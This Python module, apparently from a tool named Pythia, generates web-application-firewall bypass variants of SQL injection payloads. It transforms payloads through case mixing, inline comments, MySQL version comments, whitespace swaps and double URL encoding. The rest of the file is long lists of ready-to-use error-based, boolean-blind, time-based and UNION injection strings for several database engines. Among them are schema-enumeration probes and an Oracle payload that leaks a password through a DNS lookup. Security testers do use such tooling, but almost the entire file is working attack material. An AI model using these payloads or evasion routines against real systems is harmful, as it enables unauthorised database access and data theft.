"""
Pythia WAF Bypass Payload Generator
=====================================
Generates WAF-bypass variants of SQL injection payloads for aggressive mode.

Techniques:
  - Hex encoding:        'a' → 0x61, CHAR(97)
  - URL double encoding: ' → %2527, space → %2520
  - Case variation:      UNION → uNiOn, SELECT → SeLeCt
  - MySQL inline comments: UNION/**/SELECT, /*!UNION*/
  - Whitespace variants: tab, newline, form feed in place of space
  - Comment variants:    UNION--\nSELECT, UNION#\nSELECT

Author: Rodney Dhavid Jimenez Chacin (rodhnin)
License: MIT
"""
import re
from typing import List


# -----------------------------------------------------------------------
# Core bypass transformers
# -----------------------------------------------------------------------

def _case_variation(payload: str) -> str:
    """Randomize SQL keyword casing (alternating upper/lower)."""
    keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'NOT',
                'INSERT', 'UPDATE', 'DELETE', 'DROP', 'CREATE', 'TABLE',
                'ORDER', 'GROUP', 'BY', 'HAVING', 'LIMIT', 'OFFSET',
                'SLEEP', 'BENCHMARK', 'EXTRACTVALUE', 'UPDATEXML',
                'INFORMATION_SCHEMA', 'NULL', 'CONCAT', 'CHAR', 'IF',
                'CASE', 'WHEN', 'THEN', 'ELSE', 'END', 'WAITFOR', 'DELAY']

    result = payload
    for kw in keywords:
        # Alternate case: SeLeCt
        varied = ''.join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(kw)
        )
        # Use word-boundary replacement (avoid replacing inside identifiers)
        result = re.sub(r'\b' + re.escape(kw) + r'\b', varied, result,
                        flags=re.IGNORECASE)
    return result


def _inline_comments(payload: str) -> str:
    """Insert /**/ between SQL keywords (MySQL bypass)."""
    keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR',
                'ORDER', 'GROUP', 'BY', 'SLEEP', 'CONCAT', 'CHAR',
                'IF', 'CASE', 'WHEN', 'THEN', 'ELSE', 'END']
    result = payload
    for kw in keywords:
        result = re.sub(
            r'\b' + re.escape(kw) + r'\b',
            kw[0] + '/**/' + kw[1:],
            result,
            flags=re.IGNORECASE
        )
    return result


def _space_to_comment(payload: str) -> str:
    """Replace spaces with /**/ (MySQL comment-as-whitespace)."""
    return payload.replace(' ', '/**/')


def _space_to_tab(payload: str) -> str:
    """Replace spaces with tab character."""
    return payload.replace(' ', '\t')


def _space_to_newline(payload: str) -> str:
    """Replace spaces with newline (works in many DBMS parsers)."""
    return payload.replace(' ', '\n')


def _mysql_version_comment(payload: str) -> str:
    """Wrap SQL keywords in MySQL version comments /*!...*/."""
    keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'SLEEP', 'IF']
    result = payload
    for kw in keywords:
        result = re.sub(
            r'\b' + re.escape(kw) + r'\b',
            '/*!50000' + kw + '*/',
            result,
            flags=re.IGNORECASE
        )
    return result


def _double_url_encode_quotes(payload: str) -> str:
    """Double URL-encode single quotes and spaces."""
    result = payload.replace("'", "%2527").replace('"', "%2522")
    result = result.replace(' ', '%2520')
    return result


def _hex_encode_string(s: str) -> str:
    """Encode a plain string as MySQL hex literal: 'abc' → 0x616263."""
    return '0x' + s.encode('utf-8').hex()


def _char_encode_string(s: str) -> str:
    """Encode a plain string as CHAR(n,...) function call."""
    return 'CHAR(' + ','.join(str(ord(c)) for c in s) + ')'


# -----------------------------------------------------------------------
# Public API
# -----------------------------------------------------------------------

def generate_waf_variants(payload: str, max_variants: int = 5) -> List[str]:
    """
    Generate WAF-bypass variants of a single payload.

    Returns up to max_variants unique variants (not including original).
    Prioritizes most effective techniques first.
    """
    transformers = [
        _inline_comments,        # Most effective: /**/ hides keywords from simple string-match WAFs
        _space_to_comment,       # Space → /**/ (MySQL specific, very common bypass)
        _case_variation,         # uNiOn SeLeCt — bypasses case-sensitive WAF rules
        _mysql_version_comment,  # /*!50000 ... */ — looks like a version conditional
        _space_to_tab,           # Tab instead of space — simple but sometimes effective
    ]

    seen = set()
    variants = []

    for transform in transformers:
        if len(variants) >= max_variants:
            break
        try:
            variant = transform(payload)
            if variant != payload and variant not in seen:
                seen.add(variant)
                variants.append(variant)
        except Exception:
            continue

    return variants


# -----------------------------------------------------------------------
# Expanded payload sets for aggressive mode
# -----------------------------------------------------------------------

# Error-based payloads (50+ for aggressive mode)
ERROR_BASED_PAYLOADS_AGGRESSIVE = [
    # ── Original / basic ────────────────────────────────────────────────
    "'",
    '"',
    "1'",
    "1\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "admin'--",
    "admin\"--",
    "1' AND '1'='1",
    "' OR 1=1--",
    "' OR 'x'='x",
    "1' ORDER BY 1--",
    "1' UNION SELECT NULL--",
    "1 OR 1=1",
    "1 AND 1=2",
    "1 OR 1=1--",
    "1 OR 1=1#",
    "1 UNION SELECT 1,2",
    "1 UNION SELECT NULL,NULL",
    "a UNION SELECT 1,2",
    "999 OR 1=1",
    "0 OR 1=1",
    # ── Stacked queries ─────────────────────────────────────────────────
    "'; SELECT 1--",
    "\"; SELECT 1--",
    "1; SELECT 1--",
    "1'; SELECT 1--",
    # ── DBMS error-triggering ────────────────────────────────────────────
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND EXP(~(SELECT * FROM(SELECT USER())a))--",
    "1 AND (SELECT 1/(SELECT 0))--",
    "' AND (SELECT 1 FROM dual WHERE 1=1 AND ROWNUM<2)--",  # Oracle
    "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM all_tables WHERE ROWNUM=1))--",  # Oracle
    "' AND (SELECT CAST(@@version AS int))--",  # MSSQL
    "' AND 1=CONVERT(int,@@version)--",  # MSSQL
    "' AND 1=(SELECT 1 FROM pg_sleep(0))--",  # PostgreSQL
    "' AND 1=CAST(1/0 AS int)--",  # PostgreSQL divide-by-zero
    # ── Boolean error combinators ────────────────────────────────────────
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR 1=2--",
    "' AND 'abc'='abc",
    "' AND 'abc'='def",
    "' AND 1=1 AND '1'='1",
    # ── Encoding / obfuscation ───────────────────────────────────────────
    "%27 OR %271%27=%271",            # URL-encoded quote
    "%27%20OR%20%271%27%3D%271",      # Full URL encoding
    "' OR/**/1=1--",
    "' OR\t1=1--",
    "' OR\n1=1--",
    "'/**/OR/**/1=1--",
    "' oR '1'='1",
    "' Or '1'='1",
    "' oR/**/1=1--",
    # ── NULL bytes ──────────────────────────────────────────────────────
    "'\x00",
    "1'\x00--",
    # ── Numeric context ──────────────────────────────────────────────────
    "1 AND 1=1",
    "1 AND 1=2",
    "1 OR 2>1",
    "1--",
    "1#",
    "0x31",          # hex '1'
]

# Boolean blind payloads (expanded)
BOOLEAN_BLIND_PAYLOADS_AGGRESSIVE_TRUE = [
    # ── Standard ────────────────────────────────────────────────────────
    "' AND '1'='1",
    "' AND 1=1--",
    "' OR '1'='1",
    "\" AND \"1\"=\"1",
    " AND 1=1",
    " OR 1=1",
    "1' AND '1'='1",
    "1 AND 1=1",
    # ── Comment variants ────────────────────────────────────────────────
    "' AND 1=1#",
    "' AND 1=1/*",
    "' AND 1=1-- -",
    " AND 1=1-- ",
    " AND 1=1#",
    # ── Whitespace variants ─────────────────────────────────────────────
    "'\tAND\t'1'='1",
    "'\nAND\n1=1--\n",
    "' AND/**/'1'='1",
    "'/**/AND/**/1=1--",
    # ── Case variation ──────────────────────────────────────────────────
    "' aNd '1'='1",
    "' AnD 1=1--",
    "' aND 1=1--",
    # ── Numeric ─────────────────────────────────────────────────────────
    "1 AND 2>1",
    "1 AND 'x'='x'",
    "1 AND CHAR(49)='1'",
    # ── MySQL version comment ────────────────────────────────────────────
    "' /*!AND*/ '1'='1",
    # ── LIKE / REGEXP alternative conditions ────────────────────────────
    "' AND 'a' LIKE 'a",
    "' AND 'a' REGEXP 'a",
    # ── BETWEEN ─────────────────────────────────────────────────────────
    "' AND 1 BETWEEN 0 AND 2--",
    # ── IN / NOT IN ─────────────────────────────────────────────────────
    "' AND 1 IN (1,2,3)--",
    # ── Subquery ────────────────────────────────────────────────────────
    "' AND (SELECT 1)=1--",
    "' AND (SELECT 'a')='a'--",
]

BOOLEAN_BLIND_PAYLOADS_AGGRESSIVE_FALSE = [
    # ── Standard ────────────────────────────────────────────────────────
    "' AND '1'='2",
    "' AND 1=2--",
    "' AND '1'='0",
    "\" AND \"1\"=\"2",
    " AND 1=2",
    " AND 1=0",
    "1' AND '1'='2",
    "1 AND 1=2",
    # ── Comment variants ────────────────────────────────────────────────
    "' AND 1=2#",
    "' AND 1=2/*",
    "' AND 1=2-- -",
    " AND 1=2-- ",
    " AND 1=2#",
    # ── Whitespace variants ─────────────────────────────────────────────
    "'\tAND\t'1'='2",
    "'\nAND\n1=2--\n",
    "' AND/**/'1'='2",
    "'/**/AND/**/1=2--",
    # ── Case variation ──────────────────────────────────────────────────
    "' aNd '1'='2",
    "' AnD 1=2--",
    "' aND 1=2--",
    # ── Numeric ─────────────────────────────────────────────────────────
    "1 AND 2<1",
    "1 AND 'x'='y'",
    "1 AND CHAR(49)='2'",
    # ── MySQL version comment ────────────────────────────────────────────
    "' /*!AND*/ '1'='2",
    # ── LIKE / REGEXP ────────────────────────────────────────────────────
    "' AND 'a' LIKE 'b",
    "' AND 'a' REGEXP 'b",
    # ── BETWEEN ─────────────────────────────────────────────────────────
    "' AND 1 BETWEEN 5 AND 10--",
    # ── IN ───────────────────────────────────────────────────────────────
    "' AND 1 IN (2,3,4)--",
    # ── Subquery ────────────────────────────────────────────────────────
    "' AND (SELECT 1)=2--",
    "' AND (SELECT 'a')='b'--",
]

# Time-based payloads (expanded, all DBMS)
TIME_BASED_PAYLOADS_AGGRESSIVE = [
    # ── MySQL SLEEP ──────────────────────────────────────────────────────
    {'payload': "'; SELECT SLEEP(3)-- ", 'dbms': 'MySQL'},
    {'payload': "; SELECT SLEEP(3)-- ", 'dbms': 'MySQL'},
    {'payload': "' ; SELECT SLEEP(3)-- ", 'dbms': 'MySQL'},
    {'payload': "' AND IF(1=1, SLEEP(3), 0)-- ", 'dbms': 'MySQL'},
    {'payload': " AND IF(1=1, SLEEP(3), 0)-- ", 'dbms': 'MySQL'},
    {'payload': "' OR IF(1=1, SLEEP(3), 0)-- ", 'dbms': 'MySQL'},
    {'payload': " AND SLEEP(3)-- ", 'dbms': 'MySQL'},
    {'payload': "' AND SLEEP(3)-- ", 'dbms': 'MySQL'},
    {'payload': " AND SLEEP(3)#", 'dbms': 'MySQL'},
    # ── MySQL WAF bypass variants ────────────────────────────────────────
    {'payload': "' AND/**/IF(1=1,SLEEP(3),0)--", 'dbms': 'MySQL'},
    {'payload': "' AND\tIF(1=1,SLEEP(3),0)--", 'dbms': 'MySQL'},
    {'payload': "' aNd IF(1=1,SLEEP(3),0)--", 'dbms': 'MySQL'},
    {'payload': "' AND IF(1=1,/*!SLEEP*/(3),0)--", 'dbms': 'MySQL'},
    {'payload': "' AND 1=1 UNION SELECT SLEEP(3)--", 'dbms': 'MySQL'},
    {'payload': "%27%20AND%20IF(1%3D1%2CSLEEP(3)%2C0)--", 'dbms': 'MySQL'},
    # ── MySQL BENCHMARK ──────────────────────────────────────────────────
    {'payload': "' AND BENCHMARK(5000000, SHA1('a'))-- ", 'dbms': 'MySQL'},
    {'payload': " AND BENCHMARK(5000000, SHA1('a'))-- ", 'dbms': 'MySQL'},
    {'payload': "' AND BENCHMARK(10000000,MD5(1))--", 'dbms': 'MySQL'},
    # ── MSSQL WAITFOR ────────────────────────────────────────────────────
    {'payload': "' WAITFOR DELAY '0:0:3'-- ", 'dbms': 'MSSQL'},
    {'payload': " WAITFOR DELAY '0:0:3'-- ", 'dbms': 'MSSQL'},
    {'payload': "'; WAITFOR DELAY '0:0:3'-- ", 'dbms': 'MSSQL'},
    {'payload': "' AND 1=1; WAITFOR DELAY '0:0:3'--", 'dbms': 'MSSQL'},
    {'payload': "' OR WAITFOR DELAY '0:0:3'--", 'dbms': 'MSSQL'},
    # ── PostgreSQL ───────────────────────────────────────────────────────
    {'payload': "'; SELECT pg_sleep(3)-- ", 'dbms': 'PostgreSQL'},
    {'payload': "; SELECT pg_sleep(3)-- ", 'dbms': 'PostgreSQL'},
    {'payload': "' AND pg_sleep(3)-- ", 'dbms': 'PostgreSQL'},
    {'payload': " AND pg_sleep(3)-- ", 'dbms': 'PostgreSQL'},
    {'payload': "' OR pg_sleep(3)--", 'dbms': 'PostgreSQL'},
    {'payload': "' AND 1=(SELECT 1 FROM pg_sleep(3))--", 'dbms': 'PostgreSQL'},
    # ── Oracle ───────────────────────────────────────────────────────────
    {'payload': "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", 'dbms': 'Oracle'},
    {'payload': " AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", 'dbms': 'Oracle'},
    {'payload': "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", 'dbms': 'Oracle'},
    {'payload': "' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM dba_users WHERE rownum=1))--", 'dbms': 'Oracle'},
    # ── SQLite ───────────────────────────────────────────────────────────
    {'payload': "' AND 1=1 AND (SELECT RANDOMBLOB(100000000))-- ", 'dbms': 'SQLite'},
    {'payload': " AND (SELECT RANDOMBLOB(50000000))-- ", 'dbms': 'SQLite'},
]

# UNION-based payloads (expanded)
UNION_BASED_PAYLOADS_AGGRESSIVE = [
    # ── Standard column count probes ────────────────────────────────────
    "ORDER BY 1--",
    "ORDER BY 2--",
    "ORDER BY 3--",
    "ORDER BY 4--",
    "ORDER BY 5--",
    "ORDER BY 10--",
    "ORDER BY 100--",
    # ── UNION SELECT probes ──────────────────────────────────────────────
    "UNION SELECT NULL--",
    "UNION SELECT NULL,NULL--",
    "UNION SELECT NULL,NULL,NULL--",
    "UNION SELECT NULL,NULL,NULL,NULL--",
    "UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "UNION ALL SELECT NULL--",
    "UNION ALL SELECT NULL,NULL--",
    "UNION ALL SELECT NULL,NULL,NULL--",
    # ── Data extraction ──────────────────────────────────────────────────
    "UNION SELECT 1,2,3--",
    "UNION SELECT 1,2,3,4--",
    "UNION SELECT @@version,2--",
    "UNION SELECT @@version,NULL--",
    "UNION SELECT NULL,@@version--",
    "UNION SELECT user(),2--",
    "UNION SELECT NULL,user()--",
    "UNION SELECT database(),2--",
    "UNION SELECT NULL,database()--",
    "UNION SELECT table_name,2 FROM information_schema.tables--",
    "UNION SELECT column_name,2 FROM information_schema.columns--",
    # ── WAF bypass variants ──────────────────────────────────────────────
    "UNION/**/SELECT/**/NULL--",
    "UNION/**/SELECT/**/NULL,NULL--",
    "UNION\tSELECT\tNULL--",
    "UNION\nSELECT\nNULL--",
    "uNiOn SeLeCt NULL--",
    "uNiOn SeLeCt NULL,NULL--",
    "UNION/*!50000SELECT*/NULL--",
    "/*!UNION*//*!SELECT*/NULL--",
    "%55NION%20SELECT%20NULL--",  # URL encoded U
    # ── PostgreSQL specific ──────────────────────────────────────────────
    "UNION SELECT NULL::text--",
    "UNION SELECT current_user,NULL--",
    "UNION SELECT version(),NULL--",
    # ── Oracle specific ──────────────────────────────────────────────────
    "UNION SELECT NULL FROM dual--",
    "UNION SELECT NULL,NULL FROM dual--",
]
